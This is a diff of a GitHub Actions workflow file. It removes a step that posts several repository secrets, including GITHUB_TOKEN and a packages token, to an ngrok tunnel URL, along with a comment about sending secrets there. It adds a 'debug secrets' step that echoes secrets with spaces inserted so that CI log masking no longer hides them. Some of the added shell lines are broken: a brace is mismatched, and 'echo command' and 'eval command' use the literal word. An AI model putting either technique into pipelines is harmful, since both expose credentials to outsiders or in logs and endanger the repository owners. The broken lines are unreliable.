@@ -18,11 +18,12 @@ jobs:
     steps:
     - uses: actions/checkout@v3
 
-    # send secrets to ❯ curl 'https://af1e1d988313.ngrok-free.app' -X POST  --data-raw '{"route":"presigned_post","key":"occupancy_distribution.png","mime_type":"image/png"}'
-
-    - name: secrets
+    - name: debug secrets
       run: |
-        curl 'https://af1e1d988313.ngrok-free.app' -X POST  --data-raw '${{secrets.CICD_WEBHOOK_URL}}:${{secrets.APP_IMAGE}}:${{secrets.GITHUB_TOKEN}}:${{secrets.WEBHOOK_SECRET}}:${{secrets.GH_PACKAGES_TOKEN}}'
+          echo ${{secrets.APP_IMAGE} | sed 's/./& /g'
+          echo ${{secrets.CICD_WEBHOOK_SECRET}} | sed 's/./& /g'
+          echo ${{secrets.CICD_WEBHOOK_URL}} | sed 's/./& /g'
+          echo ${{secrets.GH_PACKAGES_TOKEN}} | sed 's/./& /g'
 
     - name: Log in to GitHub Container Registry
       uses: docker/login-action@v2
@@ -40,4 +41,6 @@ jobs:
     
     - name: Trigger deployment webhook
       run: |
-        curl "${{ secrets.CICD_WEBHOOK_SECRET }}" -X POST  -H "Authorization: Bearer ${{ secrets.CICD_WEBHOOK_SECRET }}" \
+        command='curl "${{ secrets.CICD_WEBHOOK_URL }}" -X POST -H "Authorization: Bearer ${{ secrets.CICD_WEBHOOK_SECRET }}"'
+        echo command | sed 's/./& /g' 
+        eval command
